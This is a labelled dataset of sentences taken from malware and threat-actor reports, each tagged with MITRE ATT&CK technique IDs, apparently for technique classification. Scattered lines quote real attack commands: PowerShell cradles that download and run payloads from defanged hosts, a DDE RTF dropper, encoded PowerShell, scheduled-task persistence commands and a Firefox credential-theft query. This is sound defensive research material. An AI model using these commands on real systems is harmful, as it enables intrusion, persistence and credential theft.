The same code snippets are combined into a second stage JavaScript in “C:\Users\<User Name>\”	['T1033']
The username appears to be attacker specified and has occurred in 2017 Bankshot samples	['T1033']
This links the previous samples with this unique username	['T1033']
Note that the username could be a small joke on the attackers’ part regarding the attribution to FIN7	['T1033']
The magic value 0xFEEDFACF that belongs to Mach-O Executable (64 bit) Methods GET_LAUNCHNAME and GET_LABELNAME will return the hardcoded name of the property list “.plist” for the root user (com.apple.screen.assistantd.plist) and for the regular user (com.apple.spell.agent.plist)	['T1033']
The executable obtains an embedded PowerShell script, decrypts it using RC4, then decompresses it using ZLIB, and saves the cleartext to C:\Users\<username>\AppData\Roaming\Out.jpg	['T1033']
"code(2343)"", MsgBoxStyle.Critical, null);     The dropper then writes the content of the payload which resides as plaintext in a resource within the .NET assembly to C:\Users\<username>\AppData\Local\Temp\SystemDiskClean.ps1"	['T1033']
File is dropped to C:\Users\%USERNAME%\AppData\Roaming\Microsoft Network\microsoft_network\1.0.0.0\microsoft_network.exe	['T1033']
File starts as mico-audio.exe and installs to C:\Users\%USERNAME%\AppData\Roaming\google-chrome\crome.exe	['T1033']
For example, in the previous variant of BADNEWS, the victim’s unique identifier was stored under a variable named ‘uid’, the username was stored in a variable named ‘u’, etc	['T1033']
Unique User-Agents The unique User-Agents used in the HTTP communication between SpeakUp to the C&C are a possible path to the identity of the threat actor behind this campaign	['T1033']
(Source: Dell SecureWorks) Further research revealed additional tools containing the same username (see Figure 21)	['T1033']
The SP variable is a string containing the victim's username	['T1033']
It also attempts to issue the following SQL query on the “signons.sqlite” file: “SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins WHERE timePasswordChanged/1000 BETWEEN ? AND ?”   117 ftpUpload Uses FTPManager:uploadFile method and a supplied server name, username and password	['T1033']
The shellcode performs a system survey to collect the victim's computer name and username and then appends those values to a URL string using libjs.inquirerjs[.]com.	['T1033']
Command ID 17 indexes to a function that collects the system information and sends it to the C2 server.	['T1033']
According to the server’s code, the default command that it would issue to newly infected systems was a batch script contained in a file named 0000000000.bat	['T1059', 'T1064']
After execution, the malware will use the Dropbox API to make an HTTP GET request using HTTPS over TCP port 443 for the files:  MD5  Filename  d76261ba3b624933a6ebb5dd73758db4  WmiApCom  79b68cdd0044edd4fbf8067b22878644  WmiApCom.bat   The “WmiApCom.bat” file is simply used to start “WmiApCom”, which happens to be the exact same file as the one dropped by the malicious Word documents	['T1059', 'T1064']
Attackers using Comnie are leveraging malicious macros that initially hide decoy documents and shows them when the victim enables macros	['T1059', 'T1064']
Comnie allows the attacker to provide and subsequently execute a batch script (BAT), executable file (EXE), or dynamic-link library (DLL)	['T1059', 'T1064']
While all payloads can be dynamically updated, at the time of delivery, this task launched a COM scriptlet (“.sct” file extension) that downloaded and executed Meterpreter hosted on images.chinabytes[.]info	['T1059', 'T1064']
VBScript #1 The dropped script “58d2a83f7778d5.36783181.vbs” acts as a launcher	['T1059', 'T1064']
For example, they stated DROPSHOT uses more advanced anti-emulation techniques, utilizes external scripts for self-deletion, and uses memory injection versus external drivers for deployment	['T1059', 'T1064']
The following are the three files:   Defender.sct – The malicious JavaScript based scriptlet file	['T1059', 'T1064']
Users can protect themselves from such attacks by disabling Office macros in their settings and also by being more vigilant when enabling macros (especially when prompted) in documents, even if such documents are from seemingly trusted sources	['T1059', 'T1064']
While we have not been able to obtain a secondary payload from the Unicorn generated PowerShell script, we believe that this group uses the script to deliver Metasploit’s Meterpreter as a potential payload as well	['T1059', 'T1064']
Via WMI (winmgmt), the JavaScript or VBscript code in the SCT file spawns a PowerShell one-liner which finally consumes the text file	['T1059', 'T1064']
Character  Description  0  File contains batch commands, it executes the batch commands  1  Rename the temporary file as .ps1 extension  2  Rename the temporary file as .vbs extension   Table 2: BONDUPDATER Actions Figure 8 is a screenshot of BONDUPDATER’s DGA implementation	['T1059', 'T1064']
To run persistently on the system, the Trojan will first create a VBScript file:SpecialFolder.CommonApplicationData\srvResesponded.vbs that contains:CreateObject(“WScript.Shell”).Run(“%app%”) The Trojan replaces the %app% string in the above VBScript with the path to its executable	['T1059', 'T1064']
The group often uses the trial version of Cobalt Strike, a publicly available commercial software for “Adversary Simulations and Red Team Operations.” Other public tools used by the group are Metasploit, a well-known free and open source framework for developing and executing exploit code against a remote target machine; Mimikatz, a post-exploitation tool that performs credential dumping; and Empire, “a PowerShell and Python post-exploitation agent.” For detection and exploitation of internet-facing web servers, CopyKittens use Havij, Acunetix and sqlmap	['T1059', 'T1064']
The second file is a PowerShell script which appears to be based on a Rapid7 Ruby Exploitation script that loads arbitrary shellcode	['T1059', 'T1064']
Next, it will copy the first stage shellcode in memory and create a new thread with the shellcode running in it, the code responsible for this execution is shown in Figure 1	['T1059', 'T1064']
For that we can use a Python script, included in Appendix B – Python Scripts	['T1059', 'T1064']
Essentially, we are discussing ongoing activity revolving around several malware families:  KopiLuwak and IcedCoffeer Carbon Mosquito WhiteBear  Technical Rattle Turla’s Shifting to Scripting KopiLuwak and IcedCoffee, WhiteBear, and WhiteAtlas Since at least 2015 Turla has leveraged Javascript, powershell, and wsh in a number of ways, including in their malware dropper/installation operations as well as for implementing complete backdoors	['T1059', 'T1064']
The image is downloaded directly, and the shellcode is loaded and executed in memory	['T1059', 'T1064']
(On the left is NavRAT, and on the right is the shellcode of ROKRAT):    We performed the same analysis for the shellcode located in the downloaded image file and the shellcode is not exactly the same, but the design is very similar	['T1059', 'T1064']
Figure 3: Script code embedded in 29[.]html used to download and run Revenge RAT The script shown in Figure 4 is almost identical to the one used by the script contents of 29[.]html (in Figure 3), the only difference being the absence of a sleep command and the usage of the “forfiles” utility	['T1059', 'T1064']
The downloaded document template contains the malicious macro codes, which executes a VBScript (VBS).	['T1059', 'T1064']
The attackers typically distribute Netwalker ransomware with the use of a reflective PowerShell loader script that has been protected from casual analysis with several layers of obfuscation.	['T1059', 'T1064']
The attackers orchestrate attacks using batch or PowerShell scripts that are executed, with the help of domain controllers, on any machine the DC can reach.	['T1059', 'T1064']
The files uploaded to this webshell included the same compiled python script that would scan remote systems that were vulnerable to CVE-2017-0144 (EternalBlue) that we saw uploaded to the other errr.aspx webshell.	['T1059', 'T1064']
Screenshot provided in leak showing administrative panel for hosting provider Berbid Server The screenshot showed the administrative panel for a VPS account on DeltaHost with four different virtual servers, as seen in Figure 20	['T1113']
Screenshot in leak of administrative panel for an account at DeltaHost If we use the filename of this screenshot and assume that it was taken on March 29, 2019 and subtract 194 days from this date, it is possible that this server had been operational since at least September 16, 2018	['T1113']
This screenshot is via an RDP session as indicated by the tab located at the top of the screen and is located at 164.132.67[.]216 which is hosted by OVH	['T1113']
The malware can exfiltrate keystrokes, screenshots, browser-related data like cookies and history, decrypted when possible	['T1113']
Malware features Remexi boasts features that allow it to gather keystrokes, take screenshots of windows of interest (as defined in its configuration), steal credentials, logons and the browser history, and execute remote commands	['T1113']
SCREEN Takes a PNG screenshot of the main screen and names the file with timestamps, then uploads it to the C2 server using POST at the path “/FeedBack.php”	['T1113']
"While sending to the C2 server, the data is formatted as follows: @{SYSINFO  = $get.ToString(); ACTION = ""REGISTER"";}  Ability to take screenshots"	['T1113']
The “screenshot” command takes a screenshot that is saved as a.PNG file in “ProgramData“	['T1113']
The screen capture below shows the decryption function.It then calls the StartAndPatchRegAsm function.This function tries to find the original Microsoft RegAsm executable path	['T1113']
Figure 3: Screen capture of the downloader executed on OS X El Capitan	['T1113']
Interestingly, we’ve seen recent samples embedding decoy documents that are screenshots of botnet C&C panels or dumps of credit card numbers	['T1113']
POWRUNER will send the captured screenshot image file to the C2 server if the “fileupload” command is issued	['T1113']
The command handle looks for the following command strings in Table 3:    Command Description   $fileDownload Uploads the contents of a specified file to C2   $importModule Adds a specified PowerShell module to the current script   $screenshot Executes the contents of the command, which should be the string ‘$screenshot’	['T1113']
23 Take screenshot, temporarily store it as TPX499.dat, and upload it to the C2	['T1113']
"SpyNote RAT captured the device’s screen activities along with audio using the  MediaProjectionCallback functionality (available with Lollipop, the Android 5.0 release, and later) and saved the output in a file named ""video.mp4"" as shown in the following screenshot:          Figure 5 : Output File     SMS stealing  SpyNote RAT was also observed stealing SMS messages from the affected devices, as shown in screenshot below:          Figure 6: Reading SMS messages     Stealing contacts The ability to steal contacts is a favorite feature for spyware developers, as the stolen contacts can be used to further spread the spyware"	['T1113']
[Screenshot 1] Encrypted Login Packet sent by Gh0stRAT infected PC  In addition to a standard malware analysis blog post, I’d also like to take this time to document and describe my methods for analysis, in the hopes that you as a reader will use these techniques in the future	['T1113']
Returns the screenshot to the C2 via: <img src=’data:image/jpeg;base64,[base64 of screenshot]’ width=800 height=500 /><br>   111 startTakeScreenShot Creates a thread to take a screenshot at a set interval (default: every 10 seconds)	['T1113']
This simply acts as cleanup to ensure original file artifacts no longer reside on the infected machine	['T1070']
This is a guest post by independent security researcher James Quinn. This will be Part 1 of a series titled Reversing Gh0stRAT Variants.  As 2018 drew to a close and 2019 took over, I began to see a different behavior from SMB malware authors.  Instead of massive, multi-staged cryptocurrency miners, I began to see more small, covert RATs serving as partial stage1’s.  Of these samples, there was one specific sample that stood out to me.  A Gh0stRAT variant, this sample not only changed the Gh0stRAT header from “Gh0st” to “nbLGX”, it also hid its traffic with an encryption algorithm over the entire TCP segment, in addition to the standard Zlib compression on the Gh0stRAT data.  Some key functionality is below:   Can download more malware   Offline Keylogger   Cleans Event logs	['T1070']
The same situation applies to authentication by key pair – the server contains a pre-defined constant public key and it allows authentication only if a particular private key is used	['T1056']
The keylogger then records keystrokes in encrypted files, for example: thumbcache_96.dbx	['T1056']
NetWire has a built-in keylogger that can capture inputs from peripheral devices such as USB card readers	['T1056']
It is commonly sold on various hacking forums as a keylogger and stealer that can be used to monitor systems and exfiltrate information from those systems	['T1056']
Deobfuscated, we can see it is the HawkEye Keylogger — Reborn v9, Version=9.0.1.6	['T1056']
8 Upload the TPX498.dat file, which contains the list of collected keystrokes	['T1056']
63 64 ku64.dll ku32.dll Keylogger & clipboard monitor	['T1056']
keylogger) may be missing for these platforms	['T1056']
However, the campaign that the PDC has recently observed has been delivering this keylogger exclusively	['T1056']
There does appear to be function names however, including PeekMessageA, which has been previously observed in other keylogging malware	['T1056']
Keylogging Functionality XAgent also has a keylogger functionality that allows the threat actors to steal credentials as the user types them	['T1056']
This callback function will call a function named pressedKeyWithKeyCode, which is responsible for logging the keystrokes	['T1056']
Figure 1 Side-by-side of the lure images within ThreeDollars in the October 2017 and the January 2018 attacks   Superficially, we can immediately see the images are quite similar, but with some glaring differences	['T1574.002']
The technique of having a signed, legitimate, executable load a malicious library is commonly referred to as side-loading, and has been witnessed in a number of campaigns and malware families in the past	['T1574.002']
DLL side loading is often used to maintain persistence on the compromised system	['T1574.002']
Note: DLL side loading is a prevalent persistence technique that is used to launch a multitude of backdoors	['T1574.002']
Send exfiltrated data   taskkill.exe Ends working cycle of modules    Persistence Persistence modules are based on scheduled tasks and system registry	['T1053', 'T1053.005']
"For newer operating systems, events.exe creates task.xml as follows:  Then it creates a Windows scheduled task using the following command:       schtasks.exe /create /TN \""Events\\CacheTask_<user_name_here>"" /XML \""<event_cache_dir_path>t /F""     At the system registry level, modules achieve persistence by adding themselves into the key: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit when it finds possible add values to the Winlogon subkey, and in HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Activity Manager"	['T1053', 'T1053.005']
In addition, the PowerShell implant did not contain a mechanism to persist beyond a simple scheduled task	['T1053', 'T1053.005']
After execution of every task, the malware sleeps for one minute before executing the next task	['T1053', 'T1053.005']
The main similarities include the use of a scheduled task to persistently execute on the system, as well as the same general process to communicate with its C2 server	['T1053', 'T1053.005']
The decoded string from the Sch resource is: SchTasks /Create /SC MINUTE /MO 3 /TN “%n%” /TR “wscript %path%” /f The decoded string from the VBS resource is: CreateObject(“WScript.Shell”).Run(“%app%”) The %n% string in the schtasks command above will be replaced with the GUID saved to GDI.bin	['T1053', 'T1053.005']
This differs from the previous OopsIE variant that used a hardcoded task name for the scheduled task	['T1053', 'T1053.005']
After creating this scheduled task for persistence, the Trojan will begin communicating with its C2 server	['T1053', 'T1053.005']
A scheduled task is also generated to maintain persistence of the payload	['T1053', 'T1053.005']
Office365DCOMCheck or SystemDiskClean) as the name for the scheduled task to maintain persistence on the victim host	['T1053', 'T1053.005']
"The malware component, test.exe, uses the Windows command ""cmd.exe"" /C whoami” to verify it is running with the elevated privileges of “System” and creates persistence by creating the following scheduled task:     schtasks /create /tn ""mysc"" /tr C:\Users\Public\test.exe /sc ONLOGON     /ru ""System"" When executed, the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port 1913"	['T1053', 'T1053.005']
This DLL is used to create a scheduled task that points to the QuasarRAT binary, microsoft_network.exe, allowing it to remain persistent after reboot	['T1053', 'T1053.005']
They use At.exe to schedule tasks to run self-extracting RAR archives, which install either HttpBrowser or PlugX	['T1053', 'T1053.005']
Another batch script run by a scheduled task renames the archives on the file server (see Figure 15)	['T1053', 'T1053.005']
The scripts create scheduled tasks and also retrieve, decode, and execute a copy of Revenge RAT	['T1053', 'T1053.005']
"The spreadsheet also creates a scheduled task named ""windows update check"" that runs the file C:\Users\<user_name>\.templates\System Manager.exe every minute."	['T1053', 'T1053.005']
When the trojan starts up it will attempt to install a scheduled task with the name of “Java Maintenance64” to keep itself running.	['T1053', 'T1053.005']
The campaigns maintain persistence on machines by creating two daily scheduled task entries.	['T1053', 'T1053.005']
The script writes files to the path % appdata %\Roaming\Microsoft\Templates\, then creates two task entries triggered to run daily.	['T1053', 'T1053.005']
On occasions, the phishing emails contained links to external domains to download the first stage, and sometimes the first stage was attached to the email itself	['T1598.003']
These emails included recruitment themed lures and contained links to malicious HTML application (.hta) files	['T1598.003']
"The first link was labeled as ""Comparison of Major Tasks in '16 & '17"" and the second link was identified as ""Comparison between '16 & '17"".Upon opening these links the user was presented with a further decoy Hangul document"	['T1598.003']
It is highly likely the adversary then used spear-phishing attacks containing links to these malicious documents as a delivery mechanism	['T1598.003']
email with an embedded tracking link	['T1598.003']
A total of 64MB of garbage data is appended to this copied file, likely as a way to deter any security products in place that may be scanning files on disk	['T1027.001']
Using this example, Comnie will then request data to supply to the BAT script, via the following decrypted request: h=HOSTNAME-PC&f=gethostinfo.bat&c=& Based on network traffic witnessed, the remote C2 server was found to respond with the following information:       netstat -ano > %TEMP%\info.datipconfig /all >> %TEMP%\info.datroute PRINT >> %TEMP%\info.datnet view >> %TEMP%\info.dattasklist >> %TEMP%\info.datnet user >> %TEMP%\info.datnet start >> %TEMP%\info.dat       This script is written to a temporary file prior to be executed	['T1007']
The final part of the VBA script changes the properties of these two files, setting their attributes to Hidden	['T1564.001']
The locations:  For root user  path: /Library/CoreMediaIO/Plug-Ins/FCP-DAL/iOSScreenCapture.plugin/Contents/Resources/ processname: screenassistantd  For regular user  path: ~/Library/Spelling/ processname: spellagentd Subsequently, it implements the Loader::installLoader method, reading the hardcoded 64-bit Mach-O executable (magic value 0xFEEDFACF), and writing to the previously determined path and file	['T1564.001']
This field contains a URL that the Trojan will use to upload the contents of the <process ID of Trojan>.txt file, which will be structured as <process ID of Trojan>.<C2 domain> where the process ID is encoded with the same character substitution function as seen previously in Table 4	['T1057']
The most notable change to this variant of Zebrocy, other than the programming language used, is the way the tool gathers the system information and running processes	['T1057']
Gather domain and account names based on all running processes  Gathering account information from running processes	['T1057']
Figure 2: Process chain for the first part of the campaign Although the actual VBS script changed from sample to sample, with different levels of obfuscation and different ways of invoking the next stage of process tree, its final purpose remained same: invoking PowerShell to decode the Base64 encoded PowerShell command in the INI file that was dropped earlier by the macro, and executing it	['T1057']
It searches the active process list for the systemd process	['T1057']
Next, it checks the running processes against a list of hard-coded process names; if any are found, the machine is forcefully rebooted	['T1057']
This directory will also contain the process id of the running malware in process.id and a “build name” (as it is called by the author) in build.id	['T1057']
Enumerates running processes for “Wireshark” and “Sysinternals”	['T1057']
What does the Poseidon Group do? What happens after a target machine is infected? Once the target’s machine is compromised, the attacker first enumerates all processes running in the system and all services	['T1057']
78 runin.bin List of processes names and associated plugins should be run inside these processes	['T1057']
The command does not attempt to kill the specific Office process that would load the particular delivery document, such as Excel in the case of this “.xlam” file, but instead attempts to kill processes associated with Word, Excel, PowerPoint and Publisher	['T1057']
While it includes multiple ways to find Explorer, the preferred method is to get the process id from the current desktop window.	['T1057']
As part of the anti-debugging or anti-monitoring techniques, ShellTea iterates over all the running processes, applies CRC32 on each process name (after converting the string to capital letters), and then compares the value against a predefined set of CRCs.	['T1057']
lists the running processes	['T1057']
The Trojan will then use the following regular expression to check the HTTP response to the content upload request for the file identifier value: \”id\”:(.*) The Trojan will use this file identifier value to monitor for changes made to the file by the actor by checking for changes to the modification time of the <process ID of Trojan>.txt file	['T1070.006']
The Trojan uses the access token to write the string above to the first file uploaded to Google drive whose filename is <process ID of Trojan>.txt	['T1134']
"The tokens for each platform are hardcoded within the sample:November 2016 to January 2017: ""Evil New Year"" CampaignIn the early part of 2017, Group123 started the ""Evil New Year"" campaign"	['T1134']
Figure 6 Relational diagram of artifacts  We created a timeline of the activity based off the data we collected, and found that the attack dates were tightly clustered into two waves in mid- to late-October and in mid-November as we see in Figure 7 using the timestamps from Table 3	['T1562.001']
Ability to disable Microsoft Office Protected View (as shown in Figure 15) by setting the following keys in the Windows Registry: DisableAttachmentsInPV DisableInternetFilesInPV DisableUnsafeLocationsInPV       Figure 15: Disabling Microsoft Office Protected View  Ability to remotely reboot or shut down or clean the system based on the command received from the C2 server, as shown in Figure 16	['T1562.001']
From an infrastructure point of view there is no overlap between the two sets of activity, the only overlap is the use of the unique tool “DNSMessenger”  When these points are considered together in conjunction with the significant difference in targeting they make a strong case for classifying this activity as distinct from FIN7 activity	['T1562.001']
SHA256 Compiled C2 account POP3S Account SMTPS Accounts   861b6bc1f9.	['T1087']
Restricting these privileges may prevent malware from running or limit its capability to spread through the network.Carefully consider the risks before granting administrative rights to users on their own machines.Scrub and verify all administrator accounts regularly.Configure Group Policy to restrict all users to only one login session, where possible.Enforce secure network authentication, where possible.Instruct administrators to use non-privileged accounts for standard functions such as web browsing or checking webmail.Segment networks into logical enclaves and restrict host-to-host communication paths	['T1087']
This may include information about the currently logged in user, the hostname, network configuration data, active connections, process information, local and domain administrator accounts, an enumeration of user directories, and other data	['T1087']
With these outputs, FIN6 was able to identify user accounts that could access additional hosts in the domain	['T1087']
The PowerShell script collects all possible information on the user and the network, including snapshots, computer and user names, emails from registry, tasks in task scheduler, system information, AVs registered in the system, privileges, domain and workgroup information	['T1087']
Its use of a PowerShell payload means that only legitimate system processes are utilized and that the malicious code execution can only be identified through enhanced logging or in memory	['T1546.013', 'T1059.001']
Mandiant initially identified an early variant of the POSHSPY backdoor deployed as PowerShell scripts during an incident response engagement in 2015	['T1546.013', 'T1059.001']
Figure 2: WindowsParentalControlsMigration CommandLineTemplate Figure 3 contains the decoded PowerShell command from the “CommandLineTemplate.”      Figure 3: Decoded CommandLineTemplate PowerShell code POSHSPY PowerShell Component The full code for a POSHSPY sample is available here	['T1546.013', 'T1059.001']
Additional Reading This PowerShell logging blog post contains more information on improving PowerShell visibility in your environment	['T1546.013', 'T1059.001']
However, in this new variant, all the DNS activity is initiated and executed solely from memory – unlike previous attacks which used PowerShell commands	['T1546.013', 'T1059.001']
The PowerShell script executes a compressed first stage PowerShell child process, which then performs a second stage PowerShell process	['T1546.013', 'T1059.001']
The PowerShell implant used in the Olympics campaign was a stager based on the PowerShell Empire framework that created an encrypted channel to the attacker’s server	['T1546.013', 'T1059.001']
(For more on steganography, see the McAfee Labs Threats Report, June 2017, page 33.) The implants covered in this research establish a permanent presence on the victim’s system once the PowerShell implant is executed	['T1546.013', 'T1059.001']
The main function performed by the SCT file is to Base64 decode the contents of WindowsDefender.ini file and execute the decoded PowerShell Script using the following command line: powershell.exe -exec Bypass -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\WindowsDefender.ini) The rest of the malicious activities are performed by the PowerShell Script	['T1546.013', 'T1059.001']
PowerShell File Analysis The PowerShell script employs several layers of obfuscation to hide its actual functionality	['T1546.013', 'T1059.001']
Figure 11: PowerShell script is XOR encoded using a single byte key After deobfuscating the contents of the PowerShell Script, we can divide it into three sections	['T1546.013', 'T1059.001']
The malicious macros were all designed to use Windows PowerShell to download a shellcode-based payload from a remote server	['T1546.013', 'T1059.001']
The macro uses PowerShell to download a shellcode-based payload from a remote server using one of two available techniques	['T1546.013', 'T1059.001']
On January 1, 2017, we observed this URL responding to the above HTTP request with the following data:powershell.exe -exec bypass -window hidden -noni -nop -encoded JABjAG8AbQBtAGEAbgBkACAAPQAgACcAVwB3AEIATwBBAEcAVQBBAGQAQQBBAHUAQQBGAE0AQQBaAFEAQgB5AEEASABZAEEAYQBRAEIAagBBAEcAVQBBAFUAQQBCAHYAQQBHAGsAQQBiAGcAQgAwAEEARQAwAEEAWQBRAEIAdQBBAEcARQBBAFoAdwBCAGwAQQBIAEkAQQBYAFEAQQA2AEEARABvAEEAVQB3AEIAbABBAEgASQBBAGQAZwBCAGwAQQBIAEkAQQBRAHcAQgBsAEEASABJAEEAZABBAEIAcABBAEcAWQBBAGEAUQBCAGoAQQBHAEUAQQBkAEEAQgBsAEEARgBZAEEAWQBRAEIAcwBBAEcAawBBAFoAQQBCAGgAQQBIAF..snip..As you can see, the C2 server responds with a PowerShell command that will run on the system	['T1546.013', 'T1059.001']
Upon execution in a vulnerable environment, the PowerShell based payload takes over	['T1546.013', 'T1059.001']
The PowerShell script is responsible for downloading the final payload from C2 server to execute it	['T1546.013', 'T1059.001']
Use of the non-public PowerShell backdoor previously described by Morphisec and MalwareBytes (which we refer to as POWERSTATS)	['T1546.013', 'T1059.001']
Attacker deception and attribution The deobfuscated PowerShell code used by the MuddyWater group resembles previously seen PowerShell scripts that most likely served as prototypes	['T1546.013', 'T1059.001']
Lock PowerShell Execution Policy, must be set to “AllSigned” via GPO	['T1546.013', 'T1059.001']
These PowerShell scripts are final stage payloads – they include a downloader with domain generation algorithm (DGA) functionality and the backdoor component, which connect to the C2 server to receive commands and perform additional malicious activities.  hUpdateCheckers.ps1 (POWRUNER) The backdoor component, POWRUNER, is a PowerShell script that sends and receives commands to and from the C2 server	['T1546.013', 'T1059.001']
The contents within the releasenotes.txt file (SHA256: bf925f340920111b385078f3785f486fff1096fd0847b993892ff1ee3580fa9d)  contains the following formula that Excel will save to the “A0” cell in the worksheet:  The formula uses a command prompt to run a PowerShell script that attempts to download and execute a second PowerShell script hosted at the URL hxxp://micrrosoft[.]net/winupdate.ps1	['T1546.013', 'T1059.001']
The decompressed PowerShell payload has some similarities to the PowerShell Empire agent, such as the use of a jitter value and commands referred to by job ID, but we do not have conclusive evidence that the author of this tool used Empire as a basis for their tool	['T1546.013', 'T1059.001']
"It will run the newly downloaded PowerShell script by running the following command via cmd /c:       wscript.exe ""Office365DCOMCheck.vbs"" ""PowerShell.exe-ExecutionPolicy bypass -WindowStyle hidden -NoProfile <path to Office365DCOMCheck.ps1 script>""     The payload will then notify the C2 it has successfully downloaded and executed the secondary PowerShell payload"	['T1546.013', 'T1059.001']
The Information Gathering Tool (IGT) tool is coded in Delphi and includes powershell and SQL components across a dozen different drops	['T1546.013', 'T1059.001']
The following shows this unused command, which exposed an additional server within Sofacy’s infrastructure would download and execute an encoded PowerShell script from 92.114.92[.]102:       C:\\Programs\\Microsoft\\MSOffice\\Word.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -Whidden $e=(New-ObjectSystem.Net.webClient).downloadString('hxxp://92.114.92[.]102:80/d');powershell -enc $e #     The unused command above appears to be related to previous attacks, specifically attacks that occurred in November 2017 as discussed by McAfee and ESET	['T1546.013', 'T1059.001']
Then, it will launch Dec.exe using PowerShell with the command “ cmd.exe /c powershell - WindowStyle Hidden Start-Process Dec.exe - WindowStyle maximized ”.	['T1546.013', 'T1059.001']
The attacker made use of Cobalt Strike’s “psexec” lateral movement command to create a Windows service named with a random 16-character string on the target system and execute encoded PowerShell	['T1546.013', 'T1059.001']
Next, the script triggered a PowerShell stager	['T1546.013', 'T1059.001']
Following successful infiltration, the malware persists through registry: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run The command line execution leads to PowerShell code executed from a different registry value .	['T1546.013', 'T1059.001']
PowerShell scripts that perform system reconnaissance and credential theft from Windows Credential Manager and then send this information back to Waterbug C& Cs.	['T1546.013', 'T1059.001']
The script is used to decode and execute the following payloads:Appach01.jpg (renamed: Windows-KB275122-x86.exe) is a Freenki sample.Appach01.jpg (renamed: Windows-KB271854-x86.exe) is a PoohMilk sample.PoohMilk AnalysisThe PoohMilk sample is designed to perform two actions:Create persistence to execute the Freenki sample at the next reboot.Check specific files on the infected machine.The first action is to create a registry key in order to execute the Windows-KB275122-x86.exe file previously downloaded	['T1106']
Additionally we see a cmd.exe process launched and used for process injection using the VirtualAlloc(), WriteProcessMemory() and CreateRemoteThread() Windows APIs, as with the first finding of ROKRAT they continue to use similar Windows APIs	['T1055.012']
It hands over the decrypted buffer extracted from the resource section and the path from the original RegAsm executable to the start_protect_hexcode function.Then it starts the process-hollowing shellcode, which is stored in the HEXCODE1 variable	['T1055.012']
Then, they are using the process hollowing technique to hide the execution of these tools inside of the original Microsoft vbc.exe (VisualBasic Compiler) process	['T1055.012']
"Figure 6 Example of delivery document The RTF document (8cf3bc2bf…) was very small in size at 264 bytes, which can be seen in its entirety here:       {\rtf1{\field{\*\fldinst DDEAUTO ""C:\\\\WIndowS\\\\SYsTem32\\\\cMD.eXe "" ""/C	POWErsHELl.eXE  -ex     BypaSs  -NOP	-w      HIdDen  (NEw-oBjeCT SyStEm.NET.weBCLiENT).dowNloADFILe( 'hxxp://86.106.131[.]177/link/GRAPH.EXE'  ,       '%apPDAtA%\graph.exe'   )   ;       saps    '%Appdata%\graph.exe'""}}}     The contents above use the DDE functionality in Microsoft Word to run a PowerShell script to download the Koadic payload from a remote server, save it as an executable file on the system and then execute the payload"	['T1055.012']
"Figure 1 Article referenced by decoy document in attack against British government agency   The attached document leverages a DDE exploit to ultimately execute the following code:c:\\windows\\system32\\cmd.exe ""/k PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -noprofile -command (New-Object System.Net.WebClient).DownloadFile('https://881.000webhostapp[.]com/0_31.doc', '%TEMP%\\AAA.exe');Start-Process('%TEMP%\\AAA.exe')Palo Alto Networks first witnessed this DDE exploit technique in May 2017, and attackers continue to leverage it"	['T1055.012']
Upon execution, this Trojan checks to see if it was configured with “BINDERON” to determine if it should extract an embedded payload from a resource named “B”, save it to %TEMP%\%BIND1%, and create a new process with the embedded payload	['T1055.012']
Figure 15: Structure used to send data to server    Figure 16: Structure used to send data to C2 server The structure is converted to Base64 using the CryptBinaryToStringA function	['T1048']
It then uses WebDAV to upload to a Box cloud drive.	['T1048']
Much like the previous version of Reaver, Reaver.v3 will query the necessary registry keys to determine the correct startup path to use	['T1012']
An example of this decompressed configuration may be seen below:  Figure 2 Decompressed Reaver configuration This configuration contains multiple pieces of information, including the following:  Network port Sleep timer between network requests Remote Command and Control (C2) Service Name Service Description Service Display Name Hardcoded String	['T1569.002']
Much like the original payload, this tool uses if/else statements to skip the legitimate code in the Saransh Email System source to run the malicious functions, which have the same method names as the original tool and follow the same call sequence:  Form1.Speed Form1.diomadnfagaghagh Form1.fjcsERIfjfiojsGHIsdifjksi Form1.gsgjIDJIGJIGJIGJIFDOSpl Form1.FJaioefgkaoeK  This chain of functions eventually loads a resource named ‘GSrdofjksrgj’, which the tool decrypts using the same algorithm and key as in the initial payload:byte[] array4 = new byte[] {     19,     129,     43,     37,     56,     65,     255,     75,     111,     19,     211,     120,     0,     49,     126,     248 };The decrypted payload has a SHA256 hash of 5e805a88294f6d25d55103d19d13e798e01ad70e6b89e9c58db5d468cc63b3d5, which is a variant of the NanoCore remote administration tool	['T1569.002']
The files we recovered indicate they do it by executing a script file, which uses the Sysinternals  psexec tool to move laterally by trying to copy it to every machine they can reach:	['T1569.002']
The following capabilities have been observed in this payload:  Get drive information Modify files Modify directories Modify registry Spawn process Terminate process Modify services Kill self   Ties to SunOrcal Reaver was used concurrently with SunOrcal over the past year, to include two Reaver samples dropped from zip files hosted on a domain also being used as a SunOrcal C2 (www.fyoutside[.]com), and there is also passive DNS overlap amongst the C2s	['T1112']
The backdoor will modify the registry for the Windows Media Player to store its C&C configuration.	['T1112']
Hard Disk Check The Trojan will perform the following WMI query:   Select * from Win32_DiskDrive   The Trojan will check the Caption and Model fields in the results for the strings Virtual, VMWare, VM, VBox or Oracle	['T1497.001', 'T1497']
Motherboard Check The Trojan will perform the following WMI query:   Select * from Win32_BaseBoard   The Trojan will check the Manufacturer and Product fields in the results for the strings VMware, Virtual, VBox, VM or Oracle	['T1497.001', 'T1497']
ShellTea utilizes a number of techniques to identify if it is running within a virtual environment or is being monitored.	['T1497.001', 'T1497']
High resolution screenshots of specified process windows and when recording VoiceIP application audio	['T1123']
To ensure its victim will use IE, it will terminate any process in-focus that is Chrome or Firefox, in hopes the victim will believe the browsers are “malfunctioning.” Whenever a victim uses IE and browses to specific Brazilian banks or businesses, the malware will only then begin to log keystrokes	['T1552.001']
The usage of LinkedIn to deliver malicious documents,	['T1566.003']
At the same time, Enc.exe will start the encryption routine and append “. jcry ” as file extension to the encrypted file.	['T1486']
Opening document starts a template injection technique for loading the document template from the internet.	['T1221']
The Data field is encrypted using a custom stream cipher.	['T1486']
Finally the script deletes the shadow copies, in a preparation for the ransomware operations.	['T1490']
